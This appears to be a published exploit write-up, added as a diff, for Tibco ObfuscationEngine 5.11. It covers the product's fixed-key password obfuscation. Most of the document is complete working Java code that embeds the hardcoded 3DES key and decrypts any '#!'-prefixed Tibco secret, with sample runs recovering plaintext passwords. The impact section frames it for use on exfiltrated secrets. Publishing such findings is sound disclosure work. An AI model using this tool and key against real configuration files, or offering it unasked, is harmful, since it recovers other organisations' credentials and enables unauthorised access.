@@ -1,0 +1,136 @@
+# Exploit Title: Tibco ObfuscationEngine 5.11 - Fixed Key Password Decryption
+# Date: December 8th 2020
+# Exploit Author: Tess Sluijter
+# Vendor Homepage: https://www.tibco.com
+# Version: 5.11x and before
+# Tested on: MacOS, Linux, Windows
+
+# Tibco password decryption exploit
+
+## Background
+
+Tibco's documentation states that there are three modes of operation for this ObfuscationEngine tooling:
+
+1. Using a custom key.
+2. Using a machine key.
+3. Using a fixed key.
+
+https://docs.tibco.com/pub/runtime_agent/5.11.1/doc/pdf/TIB_TRA_5.11.1_installation.pdf?id=2
+
+This write-up pertains to #3 above. 
+Secrets obfuscated using the Tibco fixed key can be recognized by the fact that they start with the characters #!. For example: "#!oe2FVz/rcjokKW2hIDGE7nSX1U+VKRjA".
+
+## Issues
+
+On Tibco's forums, but also on other websites, people have already shared Java code to decrypt secrets encrypted with this fixed key. For example:
+
+* https://support.tibco.com/s/article/Tibco-KnowledgeArticle-Article-30338
+* https://community.tibco.com/questions/password-encryptiondecryption
+* https://community.tibco.com/questions/deobfuscatedecrypt-namevaluepairpassword-gv-file
+* https://community.tibco.com/questions/bw6-password-decrypt
+* http://tibcoworldin.blogspot.com/2012/08/decrypting-password-data-type-global.html
+* http://tibcoshell.blogspot.com/2016/07/how-to-decrypt-encryptedmasked-password.html
+
+## Impact
+
+Regardless of country, customer, network or version of Tibco, any secret that was obfuscated with Tibco's ObfuscationEngine can be decrypted using my Java tool. It does **not** require access to Tibco software or libraries. All you need are exfiltrated secret strings that start with the characters #!. This is not going to be fixed by Tibco, this is a design decision also used for backwards compatibility in their software.
+
+## Instructions
+
+Compile with:
+
+javac decrypt.java
+
+Examples of running, with secrets retrieved from websites and forums:
+
+java Decrypt oe2FVz/rcjokKW2hIDGE7nSX1U+VKRjA
+7474
+
+java Decrypt BFBiFqp/qhvyxrTdjGtf/9qxlPCouNSP
+tibco
+
+/* comments!
+Compile with: 
+		javac decrypt.java
+		
+Run as:
+		java Decrypt oe2FVz/rcjokKW2hIDGE7nSX1U+VKRjA
+		7474
+		
+		java Decrypt BFBiFqp/qhvyxrTdjGtf/9qxlPCouNSP
+		tibco
+ */
+
+import java.io.ByteArrayInputStream;
+import java.util.Arrays;
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+
+
+class Decrypt
+{
+	public static void main (String [] arguments)
+	{
+		try
+		{
+			byte[] keyBytes = { 28, -89, -101, -111, 91, -113, 26, -70, 98, -80, -23, -53, -118, 93, -83, -17, 28, -89, -101, -111, 91, -113, 26, -70 };
+	
+			String algo = "DESede/CBC/PKCS5Padding";
+		
+			String encryptedText = arguments[0];
+			byte[] message = Base64.getDecoder().decode(encryptedText);
+
+			ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(message);
+	
+			Cipher decipher = Cipher.getInstance(algo);
+
+			int i = decipher.getBlockSize();
+			byte[] ivSetup = new byte[i];
+			byteArrayInputStream.read(ivSetup);
+
+			SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "DESede");
+	  
+			decipher.init(2, key, new IvParameterSpec(ivSetup));
+	
+			// Magic, I admit I don't understand why this is needed.
+			CipherInputStream cipherInputStream = new CipherInputStream(byteArrayInputStream, decipher);
+			char[] plaintext;
+			char[] arrayOfChar1 = new char[(message.length - i) / 2];
+			byte[] arrayOfByte4 = new byte[2];
+			byte b = 0;
+
+			while (2 == cipherInputStream.read(arrayOfByte4, 0, 2)) {
+				arrayOfChar1[b++] = (char)((char)arrayOfByte4[1] << '\b' | (char)arrayOfByte4[0]);
+			}
+			
+			cipherInputStream.close();
+  
+			if (b == arrayOfChar1.length) {
+				plaintext = arrayOfChar1;
+			} else {
+				char[] arrayOfChar = new char[b];
+				System.arraycopy(arrayOfChar1, 0, arrayOfChar, 0, b);
+				for (b = 0; b < arrayOfChar1.length; b++) {
+				arrayOfChar1[b] = Character.MIN_VALUE;
+				}
+
+				plaintext = arrayOfChar;
+				// End of Magic
+			} 
+  
+			System.out.println(plaintext);
+
+		}
+
+		catch (Exception ex)
+		{
+			System.out.println("Barf...");
+			System.out.println(ex);
+		}
+	}
+}
